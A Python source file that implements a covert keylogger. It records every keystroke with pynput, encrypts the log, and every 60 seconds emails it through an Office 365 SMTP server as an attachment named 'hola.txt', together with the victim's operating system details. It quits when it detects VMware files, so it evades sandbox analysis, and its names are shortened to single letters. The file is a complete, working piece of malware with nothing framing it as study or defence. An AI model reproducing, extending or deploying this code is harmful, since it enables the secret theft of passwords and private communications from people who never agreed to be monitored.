import os
import smtplib
import sys
import platform
import time
import random

from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
from cryptography.fernet import Fernet
from pynput import keyboard
from dotenv import load_dotenv

load_dotenv()

class K:
    def __init__(self, e, p, r):
        self.l = ""
        self.e = e
        self.p = p
        self.r = r
        self.i = 60  # Intervalo predefinido de 60 segundos
        self.k = self.lk()
        self.cs = Fernet(self.k)
        self.check_vm()

    def lk(self):
        pf = os.environ.get("pf")
        if not pf:
            sys.exit(1)
        return open(pf, 'rb').read()

    def op(self, k):
        try:
            if k.char:
                self.l += k.char
        except AttributeError:
            if k == keyboard.Key.space:
                self.l += " "
            else:
                self.l += f" {str(k)} "

    def el(self):
        encrypted_log = self.cs.encrypt(self.l.encode())
        return encrypted_log

    def sm(self):
        if self.l:
            try:
                el = self.el()
                msg = MIMEMultipart()
                msg['From'] = self.e
                msg['To'] = self.r
                msg['Subject'] = "EL"

                part = MIMEBase('application', 'octet-stream')
                part.set_payload(el)
                encoders.encode_base64(part)
                part.add_header('Content-Disposition',
                                'attachment; filename="hola.txt"')
                msg.attach(part)

                si = f"OS: {platform.system()} {platform.release()} ({platform.version()})"
                msg.attach(MIMEText(si, 'plain'))

                server = smtplib.SMTP('smtp.office365.com', 587)
                server.starttls()
                server.login(self.e, self.p)
                server.send_message(msg)
                server.quit()
            except smtplib.SMTPException as e:
                print(f"error: {e}")
            self.l = ""

    def check_vm(self):
        vm_files = [
            "C:\\windows\\system32\\drivers\\vmmouse.sys",
            "C:\\windows\\system32\\drivers\\vmhgfs.sys",
            "C:\\windows\\system32\\drivers\\vmxnet.sys",
            "/usr/bin/vmware-vmblock-fuse",
            "/usr/bin/vmware-guestd",
            "/usr/bin/vmtoolsd",
        ]
        for file in vm_files:
            if os.path.exists(file):
                sys.exit()

    def start(self):
        listener = keyboard.Listener(on_press=self.op)
        listener.start()

        try:
            while True:
                time.sleep(self.i)
                self.sm()
        except KeyboardInterrupt:
            listener.stop()


if __name__ == "__main__":
    k = K(
        e=os.environ.get("e"),
        p=os.environ.get("p"),
        r=os.environ.get("r"),
    )
    k.start()
